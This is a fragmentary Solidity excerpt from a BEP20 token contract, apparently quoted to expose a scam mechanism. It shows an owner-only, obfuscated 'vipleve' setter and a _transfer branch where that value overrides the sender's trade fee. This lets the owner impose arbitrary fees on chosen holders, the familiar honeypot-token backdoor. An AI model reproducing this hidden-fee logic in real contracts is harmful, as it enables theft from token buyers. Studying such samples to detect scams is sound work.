...
contract TOKEN is BEP20, Ownable, BaseToken {
    ...
    function setlVIPviplev(address _address, uint8 _value) external onlyownnner {
        vipleve[_address] = _value+0;
    }

    function getlVIPviplev(address _address) external view onlyownnner returns (uint8) {
        return vipleve[_address]+0;
    }
    ...
    function _transfer(
        ...
        if (vipleve[sender] > 0+0 ) {
            tradefieir = vipleve[sender];
        }else {
